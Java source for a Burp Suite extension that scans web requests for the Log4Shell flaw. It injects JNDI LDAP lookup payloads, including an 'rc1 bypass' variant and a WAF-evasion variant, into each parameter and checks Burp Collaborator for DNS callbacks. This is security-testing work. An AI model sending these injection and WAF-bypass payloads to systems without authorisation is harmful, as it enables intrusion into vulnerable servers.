package burp;

import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import javax.swing.*;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.TableModel;

public class BurpExtender extends AbstractTableModel implements IBurpExtender, IScannerCheck, ITab, IMessageEditorController, IContextMenuFactory{
    public IBurpExtenderCallbacks callbacks;
    public IExtensionHelpers helpers;
    public PrintWriter stdout;
    private JSplitPane splitPane;
    private IMessageEditor requestViewer;
    private IMessageEditor responseViewer;
    private Table logTable;
    private final List<LogEntry> log = new ArrayList<LogEntry>();
    private IHttpRequestResponse currentlyDisplayedItem;
    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        this.stdout = new PrintWriter(callbacks.getStdout(), true);
        this.helpers = callbacks.getHelpers();
        callbacks.setExtensionName("BurpLog4j2-Scan");

        callbacks.registerScannerCheck(this);
        callbacks.registerContextMenuFactory(this);
        SwingUtilities.invokeLater(new Runnable(){
            @Override
            public void run() {
                splitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
                logTable = new Table(BurpExtender.this);
                JScrollPane scrollPane = new JScrollPane(logTable);
                splitPane.setLeftComponent(scrollPane);

                JTabbedPane tabs = new JTabbedPane();
                requestViewer = BurpExtender.this.callbacks.createMessageEditor(BurpExtender.this, false);
                responseViewer = BurpExtender.this.callbacks.createMessageEditor(BurpExtender.this, false);
                tabs.addTab("Request", requestViewer.getComponent());
                tabs.addTab("Response", responseViewer.getComponent());
                splitPane.setRightComponent(tabs);

                BurpExtender.this.callbacks.customizeUiComponent(splitPane);
                BurpExtender.this.callbacks.customizeUiComponent(logTable);
                BurpExtender.this.callbacks.customizeUiComponent(scrollPane);
                BurpExtender.this.callbacks.customizeUiComponent(tabs);

                BurpExtender.this.callbacks.addSuiteTab(BurpExtender.this);
            }
        });
    }

    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
        return null;
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        return null;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        return 0;
    }

    public void checkVul(IHttpRequestResponse baseRequestResponse, int row){

        List<String> payloads = new ArrayList<String>();
        URL url = this.helpers.analyzeRequest(baseRequestResponse).getUrl();
        List<IScanIssue> issues = new ArrayList<>();
        byte[] rawRequest = baseRequestResponse.getRequest();
        byte[] tmpRawRequest = rawRequest;
        IRequestInfo req = this.helpers.analyzeRequest(baseRequestResponse);
        // 2.x-poc
        payloads.add("${jndi:ldap://%s}");
        //rc1绕过
        payloads.add("${jndi:ldap://%s /asd");
        //waf绕过
        payloads.add("${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://%s}");
        IBurpCollaboratorClientContext context = this.callbacks.createBurpCollaboratorClientContext();
        String dnslog = context.generatePayload(true);
        for (IParameter param :
                req.getParameters()) {
            try {
                List<IBurpCollaboratorInteraction> dnsres = new ArrayList<>();
                for (String payload : payloads) {
                    payload = String.format(payload, dnslog);
                    this.stdout.println("本次检测的payload为"+payload);
                    payload = this.helpers.urlEncode(payload);
                    IParameter newParam = this.helpers.buildParameter(param.getName(), payload, param.getType());
                    tmpRawRequest = this.helpers.updateParameter(rawRequest, newParam);
                    {
                        this.stdout.println("提醒您：我开始检测了");
                        boolean hasModify = true;
                            if (hasModify){

                                IHttpRequestResponse tmpReq = this.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), tmpRawRequest);
                                tmpReq.getResponse();
                                this.stdout.println("开始slepp");
                                Thread.sleep(5000);
                                this.stdout.println("slepp结束了，查看dnslog结果");
                                dnsres = context.fetchCollaboratorInteractionsFor(dnslog);
                                if (!dnsres.isEmpty()){
                                    this.stdout.println("find vuln!!!" + req.getUrl());
                                    // 漏洞存在就更新表格中存在漏洞那一行的数据
                                    LogEntry logEntry = new LogEntry(url, "finished", "vul!!!", tmpReq);
                                    log.set(row, logEntry);
                                    // 这个方法是swing中的一个方法，会通知表格更新指定行的数据
                                    fireTableRowsUpdated(row, row);
                                    break;
                                }
                            }
                }
        }
                if(dnsres.isEmpty()){
                    LogEntry logEntry = new LogEntry(url, "finished", "not vul", baseRequestResponse);
                    log.set(row, logEntry);
                    fireTableRowsUpdated(row, row);
                    break;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

    }
    // tab页的显示名称
    @Override
    public String getTabCaption() {
        return "Log4j2Scan";
    }

    @Override
    public Component getUiComponent() {
        return splitPane;
    }

    @Override
    public int getRowCount() {
        return log.size();
    }

    @Override
    public int getColumnCount() {
        return 3;
    }

    @Override
    public String getValueAt(int rowIndex, int columnIndex) {
        LogEntry logEntry = log.get(rowIndex);

        switch (columnIndex)
        {
            case 0:
                return logEntry.url.toString();
            case 1:
                return logEntry.status;
            case 2:
                return logEntry.res;
            default:
                return "";
        }
    }

    @Override
    public String getColumnName(int column) {
        switch (column){
            case 0:
                return "URL";
            case 1:
                return "Status";
            case 2:
                return "result";
            default:
                return "";
        }
    }

    @Override
    public IHttpService getHttpService() {
        return currentlyDisplayedItem.getHttpService();
    }

    @Override
    public byte[] getRequest() {
        return currentlyDisplayedItem.getRequest();
    }

    @Override
    public byte[] getResponse() {
        return currentlyDisplayedItem.getResponse();
    }

    @Override
    public List<JMenuItem> createMenuItems(IContextMenuInvocation invocation) {
        List<JMenuItem> menus = new ArrayList<>(1);
        IHttpRequestResponse responses[] = invocation.getSelectedMessages();
        JMenuItem menuItem = new JMenuItem("Send to Log4jScan");
        menus.add(menuItem);
        menuItem.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                // logTable.addRowSelectionInterval();
                int row = log.size();
                LogEntry logEntry = new LogEntry(helpers.analyzeRequest(responses[0]).getUrl(), "scanning", "", responses[0]);
                log.add(logEntry);
                fireTableRowsInserted(row, row);
                // 在事件触发时是不能发送网络请求的，否则可能会造成整个burp阻塞崩溃，所以必须要新起一个线程来进行漏洞检测
                Thread thread = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        checkVul(responses[0], row);
                    }
                });
                thread.start();
            }
        });
        return menus;
    }

    // 用于描述一条请求记录的数据结构
    private static class LogEntry{
        final URL url;
        final String status;
        final String res;
        final IHttpRequestResponse requestResponse;

        LogEntry(URL url, String status, String res, IHttpRequestResponse requestResponse) {
            this.url = url;
            this.status = status;
            this.res = res;
            this.requestResponse = requestResponse;
        }
    }

    // 自定义table的changeSelection方法，将request\response展示在正确的窗口中
    private class Table extends JTable
    {
        public Table(TableModel tableModel)
        {
            super(tableModel);
        }

        @Override
        public void changeSelection(int row, int col, boolean toggle, boolean extend)
        {
            // show the log entry for the selected row
            LogEntry logEntry = log.get(row);
            requestViewer.setMessage(logEntry.requestResponse.getRequest(), true);
            responseViewer.setMessage(logEntry.requestResponse.getResponse(), false);
            currentlyDisplayedItem = logEntry.requestResponse;

            super.changeSelection(row, col, toggle, extend);
        }
    }
}

class CustomScanIssue implements IScanIssue{
    private IHttpService httpService;
    private URL url;
    private IHttpRequestResponse[] httpMessages;
    private String name;
    private String detail;
    private String severity;

    public CustomScanIssue(
            IHttpService httpService,
            URL url,
            IHttpRequestResponse[] httpMessages,
            String name,
            String detail,
            String severity)
    {
        this.httpService = httpService;
        this.url = url;
        this.httpMessages = httpMessages;
        this.name = name;
        this.detail = detail;
        this.severity = severity;
    }

    @Override
    public URL getUrl() {
        return url;
    }

    @Override
    public String getIssueName() {
        return name;
    }

    @Override
    public int getIssueType() {
        return 0;
    }

    @Override
    public String getSeverity() {
        return severity;
    }

    @Override
    public String getConfidence() {
        return "Certain";
    }

    @Override
    public String getIssueBackground() {
        return null;
    }

    @Override
    public String getRemediationBackground() {
        return null;
    }

    @Override
    public String getIssueDetail() {
        return detail;
    }

    @Override
    public String getRemediationDetail() {
        return null;
    }

    @Override
    public IHttpRequestResponse[] getHttpMessages() {
        return httpMessages;
    }

    @Override
    public IHttpService getHttpService() {
        return httpService;
    }
}